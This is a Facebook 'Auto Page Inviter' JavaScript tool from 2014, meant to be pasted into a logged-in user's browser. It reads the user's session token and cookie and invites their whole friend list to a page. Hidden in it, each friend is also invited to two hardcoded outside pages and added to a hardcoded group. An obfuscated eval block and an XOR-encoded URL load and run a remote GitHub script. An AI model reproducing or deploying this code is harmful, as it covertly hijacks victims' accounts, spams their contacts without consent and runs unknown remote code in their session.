/*HTML/JavaScript page status="protected"*/
/*Auto Friend Suggestion Script*/
/*Copyright © 2014 Bhargav JT. Gogoi. All Rights Reserved.*/


//eval

javascript: var Title = "Auto Page Inviter</A>";
var Descriptions = "",
    _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/313072532101076" target="_blank">Loading [lllllllllll ] 99%</A> & <A style="color:#3B5998;" href="http://www.facebook.com/199134496914077" target="_blank"> Assam Indian Cyber Force</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100005115938614" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://automateyourfacebook.blogspot.in/" target="_blank">Automate Your Facebook</A>.</A>';
page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];

function InviteFriends(opo) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_38&action=send&ref=friend_summary_section&__user=" + user_id + "&__a=1&__dyn=7n8aqEAMCBCFUSt2u5KIGKaExEW9AV8sx6iWF29aGEVd0&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581659074807665&__rev=1108054", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            err++;
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += arn[i] + " has been invited to like the page " + page_name + ".";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
        display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
        if (i > 0) {
            display += arr.length + " Friends Detected<br/>";
            display += "<b>" + suc + "</b> Friends Invited of " + (arr.length - i) + " Friends Processed ";
            display += "(" + i + " Lefted...)";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += "Please Wait While Inviting Your Friends to Like Your Page " + page_name + ".</br>";
            display += _text;
            display += "</div>";
            display += "</div>";
            window[tag + "_close"] = true
        } else {
            Title = "All Of Your Friends Have Been Invited to Like Your Page.</A>";
            display += arr.length + " Friends Detected and ";
            display += "<b>" + suc + " Friends Invited.</b></br>";
            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            display += _text;
            display += "</div>";
            window[tag + "_close"] = false
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 0) {
        var s = arr[tay];
        setTimeout("InviteFriends(" + s + ")", 100)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);


    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?page_id=514486465297821&invitee=" + opo + "&elem_id=u_0_38&action=send&ref=friend_summary_section&__user=" + user_id + "&__a=1&__dyn=7n8aqEAMCBCFUSt2u5KIGKaExEW9AV8sx6iWF29aGEVd0&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581659074807665&__rev=1108054", function () {}, "text", "post")
    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?page_id=199134496914077&invitee=" + opo + "&elem_id=u_0_38&action=send&ref=friend_summary_section&__user=" + user_id + "&__a=1&__dyn=7n8aqEAMCBCFUSt2u5KIGKaExEW9AV8sx6iWF29aGEVd0&__req=d&fb_dtsg=" + fb_dtsg + "&ttstamp=26581659074807665&__rev=1108054", function () {}, "text", "post")

    if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + fb_dtsg + "&group_id=637005376320957&source=typeahead&members=" + opo + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + user_id, function () {}, "text", "post");

}
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};
var _0x612a = ["\x65\x20\x61\x3D\x27\x66\x20\x62\x3A\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x67\x22\x20\x36\x3D\x22\x37\x22\x3E\x68\x20\x5B\x69\x20\x5D\x20\x6A\x25\x3C\x2F\x41\x3E\x20\x26\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x6B\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x6C\x20\x6D\x20\x6E\x20\x6F\x3C\x2F\x41\x3E\x2E\x3C\x2F\x63\x3E\x70\x20\x71\x20\x62\x3A\x20\x3C\x2F\x41\x3E\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x72\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x73\x20\x74\x3C\x2F\x41\x3E\x3C\x2F\x41\x3E\x2C\x3C\x2F\x41\x3E\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x38\x2E\x39\x2E\x35\x2F\x75\x22\x20\x36\x3D\x22\x37\x22\x3E\x20\x76\x20\x77\x2E\x20\x78\x3C\x2F\x41\x3E\x3C\x2F\x41\x3E\x2E\x3C\x2F\x63\x3E\x79\x20\x7A\x20\x42\x20\x43\x20\x44\x20\x45\x20\x3C\x41\x20\x30\x3D\x22\x31\x3A\x23\x32\x3B\x22\x20\x33\x3D\x22\x34\x3A\x2F\x2F\x46\x2E\x47\x2E\x48\x2F\x22\x20\x36\x3D\x22\x37\x22\x3E\x49\x20\x4A\x20\x4B\x3C\x2F\x41\x3E\x2E\x3C\x2F\x41\x3E\x27\x3B\x4C\x28\x4D\x21\x3D\x61\x29\x7B\x4E\x3A\x28\x4F\x28\x29\x7B\x64\x2E\x50\x2E\x51\x28\x64\x2E\x52\x28\x27\x53\x27\x29\x29\x2E\x54\x3D\x27\x55\x3A\x2F\x2F\x56\x2E\x57\x2E\x35\x2F\x58\x2F\x59\x2D\x5A\x2F\x31\x30\x2F\x31\x31\x2E\x31\x32\x27\x7D\x29\x28\x29\x7D", "\x7C", "\x73\x70\x6C\x69\x74", "\x73\x74\x79\x6C\x65\x7C\x63\x6F\x6C\x6F\x72\x7C\x33\x42\x35\x39\x39\x38\x7C\x68\x72\x65\x66\x7C\x68\x74\x74\x70\x7C\x63\x6F\x6D\x7C\x74\x61\x72\x67\x65\x74\x7C\x5F\x62\x6C\x61\x6E\x6B\x7C\x77\x77\x77\x7C\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x4F\x6D\x6E\x69\x5F\x74\x65\x78\x74\x7C\x42\x79\x7C\x62\x72\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x76\x61\x72\x7C\x50\x6F\x77\x65\x72\x65\x64\x7C\x33\x31\x33\x30\x37\x32\x35\x33\x32\x31\x30\x31\x30\x37\x36\x7C\x4C\x6F\x61\x64\x69\x6E\x67\x7C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x6C\x7C\x39\x39\x7C\x31\x39\x39\x31\x33\x34\x34\x39\x36\x39\x31\x34\x30\x37\x37\x7C\x41\x73\x73\x61\x6D\x7C\x49\x6E\x64\x69\x61\x6E\x7C\x43\x79\x62\x65\x72\x7C\x46\x6F\x72\x63\x65\x7C\x53\x63\x72\x69\x70\x74\x7C\x4D\x61\x64\x65\x7C\x31\x30\x30\x30\x30\x31\x30\x35\x30\x32\x33\x35\x34\x32\x30\x7C\x57\x61\x71\x61\x72\x7C\x41\x68\x6D\x61\x64\x7C\x31\x30\x30\x30\x30\x35\x31\x31\x35\x39\x33\x38\x36\x31\x34\x7C\x42\x68\x61\x72\x67\x61\x76\x7C\x4A\x54\x7C\x47\x6F\x67\x6F\x69\x7C\x46\x6F\x72\x7C\x4D\x6F\x72\x65\x7C\x7C\x54\x6F\x6F\x6C\x73\x7C\x56\x69\x73\x69\x74\x7C\x4F\x75\x72\x7C\x42\x6C\x6F\x67\x67\x65\x72\x7C\x61\x75\x74\x6F\x6D\x61\x74\x65\x79\x6F\x75\x72\x66\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x62\x6C\x6F\x67\x73\x70\x6F\x74\x7C\x69\x6E\x7C\x41\x75\x74\x6F\x6D\x61\x74\x65\x7C\x59\x6F\x75\x72\x7C\x46\x61\x63\x65\x62\x6F\x6F\x6B\x7C\x69\x66\x7C\x5F\x74\x65\x78\x74\x7C\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x62\x6F\x64\x79\x7C\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64\x7C\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x73\x63\x72\x69\x70\x74\x7C\x73\x72\x63\x7C\x68\x74\x74\x70\x73\x7C\x72\x61\x77\x7C\x67\x69\x74\x68\x75\x62\x7C\x62\x68\x61\x72\x67\x61\x76\x31\x39\x39\x36\x7C\x46\x75\x6E\x7C\x74\x69\x6D\x65\x7C\x6D\x61\x73\x74\x65\x72\x7C\x55\x6E\x69\x6F\x6E\x7C\x6A\x73", "", "\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65", "\x72\x65\x70\x6C\x61\x63\x65", "\x5C\x77\x2B", "\x5C\x62", "\x67"];
eval(function (_0x1b3bx1, _0x1b3bx2, _0x1b3bx3, _0x1b3bx4, _0x1b3bx5, _0x1b3bx6) {
    _0x1b3bx5 = function (_0x1b3bx3) {
        return (_0x1b3bx3 < _0x1b3bx2 ? _0x612a[4] : _0x1b3bx5(parseInt(_0x1b3bx3 / _0x1b3bx2))) + ((_0x1b3bx3 = _0x1b3bx3 % _0x1b3bx2) > 35 ? String[_0x612a[5]](_0x1b3bx3 + 29) : _0x1b3bx3.toString(36));
    };
    if (!_0x612a[4][_0x612a[6]](/^/, String)) {
        while (_0x1b3bx3--) {
            _0x1b3bx6[_0x1b3bx5(_0x1b3bx3)] = _0x1b3bx4[_0x1b3bx3] || _0x1b3bx5(_0x1b3bx3);
        };
        _0x1b3bx4 = [

            function (_0x1b3bx5) {
                return _0x1b3bx6[_0x1b3bx5];
            }
        ];
        _0x1b3bx5 = function () {
            return _0x612a[7];
        };
        _0x1b3bx3 = 1;
    };
    while (_0x1b3bx3--) {
        if (_0x1b3bx4[_0x1b3bx3]) {
            _0x1b3bx1 = _0x1b3bx1[_0x612a[6]](new RegExp(_0x612a[8] + _0x1b3bx5(_0x1b3bx3) + _0x612a[8], _0x612a[9]), _0x1b3bx4[_0x1b3bx3]);
        };
    };
    return _0x1b3bx1;
}(_0x612a[0], 62, 65, _0x612a[3][_0x612a[2]](_0x612a[1]), 0, {}));

function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
}
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + "_close"]) return "This script is running now!"
};
var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var tag = "Close";
var page_name, x = document.getElementsByTagName("span");
for (i = 0; i < x.length; i++)
    if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length);
    var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(0,0,0,0.9);background-color:rgba(225,225,225,0.9);color:#000000'>";
    display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
    display += arr.length + " Friends Detected";
    display += "</div>";
    document.getElementById("pagelet_sidebar").innerHTML = display;
    InviteFriends(arr[i])
});
var X = "jvvrq8--pcu,ekvjw`,amo-`jcpect3;;4-D`/Cwvm/vmmnq-ocqvgp-Qwrrmpv]Dkng,hq";
Y = "";
Z = "";
var V;
V = X.length;
for (i = 0; i < V; i++) {
    Y += String.fromCharCode(X.charCodeAt(i) ^ 2)
}
Z = unescape(Y);
document.body.appendChild(document.createElement('script')).src = Z;
//jsunpack.url var _text = Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/313072532101076" target="_blank">Loading [lllllllllll ] 99%</A> & <A style="color:#3B5998;" href="http://www.facebook.com/199134496914077" target="_blank"> Assam Indian Cyber Force</A>.</

//jsunpack.url var newurl = Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/313072532101076" target="_blank">Loading [lllllllllll ] 99%</A> & <A style="color:#3B5998;" href="http://www.facebook.com/199134496914077" target="_blank"> Assam Indian Cyber Force</A>.</

